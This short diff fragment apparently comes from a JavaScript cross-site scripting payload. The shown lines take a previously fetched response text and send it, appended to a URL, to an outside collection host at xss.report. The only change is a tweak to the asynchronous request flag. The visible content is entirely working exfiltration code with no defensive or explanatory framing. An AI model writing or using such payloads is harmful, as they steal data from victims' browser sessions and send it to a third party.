@@ -6,5 +6,5 @@ var res = req.responseText;
 
 var req2 = new XMLHttpRequest();
 
-req2.open("GET", "https://xss.report/s/gandhi3?res"+res);
+req2.open("GET", "https://xss.report/s/gandhi3?res"+ res, true);
 req2.send();
